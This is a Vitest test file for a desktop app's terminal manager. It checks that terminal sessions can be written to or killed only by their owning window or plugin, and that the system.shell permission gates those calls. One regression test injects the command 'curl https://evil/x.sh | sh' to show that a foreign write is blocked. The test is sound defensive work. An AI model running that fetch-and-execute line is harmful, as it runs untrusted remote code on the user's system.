import { beforeEach, describe, expect, it, vi } from 'vitest'

/**
 * Session ownership and the permission gate on terminal write/kill (#911).
 *
 * Only session.create was wrapped in withPermission('system.shell'), and `processes` was one
 * global map keyed by id, so write() and kill() acted on whatever id they were handed. A
 * plugin denied system.shell could guess an id — the format is
 * `proc_${Date.now()}_${9 base36 chars}` — and write into the stdin of a session the host or
 * another plugin had started, obtaining exactly the capability the gate withholds.
 */

const { spawnSafeMock, withPermissionMock } = vi.hoisted(() => ({
  spawnSafeMock: vi.fn(),
  withPermissionMock: vi.fn()
}))

vi.mock('@talex-touch/utils/common/utils/safe-shell', () => ({ spawnSafe: spawnSafeMock }))

vi.mock('../permission/channel-guard', () => ({
  // Identity by default so the ownership tests exercise the real handler; the registration
  // test below inspects the recorded calls instead.
  withPermission: withPermissionMock.mockImplementation(
    (_options: unknown, handler: unknown) => handler
  )
}))

vi.mock('@talex-touch/utils/transport/main', () => ({
  getTuffTransportMain: vi.fn(() => ({ on: vi.fn(), sendTo: vi.fn(async () => {}) }))
}))

vi.mock('../../core/runtime-accessor', () => ({
  resolveMainRuntime: vi.fn(() => ({ app: { channel: { keyManager: {} } } }))
}))

vi.mock('../../utils/logger', () => ({
  createLogger: () => ({ info: vi.fn(), warn: vi.fn(), debug: vi.fn(), error: vi.fn() })
}))

const { terminalModule } = await import('./terminal.manager')

type Testable = {
  create: (payload: { command: string; args?: string[] }, context: unknown) => { id: string }
  write: (payload: { id: string; data: string }, context: unknown) => void
  kill: (payload: { id: string }, context: unknown) => void
  onInit: (ctx: unknown) => void
  processes: Map<string, unknown>
}

const terminal = terminalModule as unknown as Testable

function fakeProcess() {
  return {
    stdin: { write: vi.fn() },
    stdout: { on: vi.fn() },
    stderr: { on: vi.fn() },
    on: vi.fn(),
    kill: vi.fn()
  }
}

/** A renderer caller. */
const asWindow = (id: number) => ({ sender: { id, isDestroyed: () => false }, eventName: 'x' })
/** A plugin caller, which is identified by uniqueKey rather than by its surface. */
const asPlugin = (uniqueKey: string, senderId = 1) => ({
  sender: { id: senderId, isDestroyed: () => false },
  eventName: 'x',
  plugin: { name: uniqueKey, uniqueKey }
})

describe('terminal session ownership', () => {
  let proc: ReturnType<typeof fakeProcess>

  beforeEach(() => {
    vi.clearAllMocks()
    terminal.processes.clear()
    proc = fakeProcess()
    spawnSafeMock.mockReturnValue(proc)
  })

  it('lets the creating window write to and kill its own session', () => {
    const owner = asWindow(7)
    const { id } = terminal.create({ command: 'ls' }, owner)

    terminal.write({ id, data: 'hello\n' }, owner)
    expect(proc.stdin.write).toHaveBeenCalledWith('hello\n')

    terminal.kill({ id }, owner)
    expect(proc.kill).toHaveBeenCalledTimes(1)
    expect(terminal.processes.has(id)).toBe(false)
  })

  it('refuses a write from a different window', () => {
    // The regression: this reached proc.stdin.write with no comparison at all.
    const { id } = terminal.create({ command: 'ls' }, asWindow(7))
    terminal.write({ id, data: 'curl https://evil/x.sh | sh\n' }, asWindow(8))
    expect(proc.stdin.write).not.toHaveBeenCalled()
  })

  it('refuses a kill from a different window', () => {
    const { id } = terminal.create({ command: 'ls' }, asWindow(7))
    terminal.kill({ id }, asWindow(8))
    expect(proc.kill).not.toHaveBeenCalled()
    expect(terminal.processes.has(id)).toBe(true)
  })

  it('refuses a plugin writing to a session the host started', () => {
    const { id } = terminal.create({ command: 'ls' }, asWindow(1))
    terminal.write({ id, data: 'x' }, asPlugin('com.evil.plugin', 1))
    expect(proc.stdin.write).not.toHaveBeenCalled()
  })

  it('separates two plugins that share a surface', () => {
    // Same webContents id, different plugins — identity is the uniqueKey, so the second
    // cannot reach the first's session.
    const { id } = terminal.create({ command: 'ls' }, asPlugin('com.a.plugin', 4))
    terminal.write({ id, data: 'x' }, asPlugin('com.b.plugin', 4))
    expect(proc.stdin.write).not.toHaveBeenCalled()

    terminal.write({ id, data: 'ok' }, asPlugin('com.a.plugin', 4))
    expect(proc.stdin.write).toHaveBeenCalledWith('ok')
  })

  it('ignores an id that does not exist without revealing the difference', () => {
    terminal.write({ id: 'proc_0_notreal', data: 'x' }, asWindow(7))
    expect(proc.stdin.write).not.toHaveBeenCalled()
  })

  it('refuses to create a session for a caller with no identity', () => {
    // Such a session could never be matched to an owner, so it would be writable by nobody
    // and would sit in the map until shutdown.
    expect(() => terminal.create({ command: 'ls' }, { eventName: 'x' })).toThrow(
      /identifiable caller/i
    )
    expect(proc.kill).toHaveBeenCalledTimes(1)
    expect(terminal.processes.size).toBe(0)
  })
})

describe('terminal handler registration', () => {
  it('gates create, write and kill on system.shell', () => {
    // The other half of the fix: ownership alone would still let a caller denied the
    // permission drive a session it had somehow been given the id for.
    withPermissionMock.mockClear()
    terminal.onInit({})

    const permissionIds = withPermissionMock.mock.calls.map(
      ([options]) => (options as { permissionId: string }).permissionId
    )
    expect(permissionIds).toEqual(['system.shell', 'system.shell', 'system.shell'])
  })
})
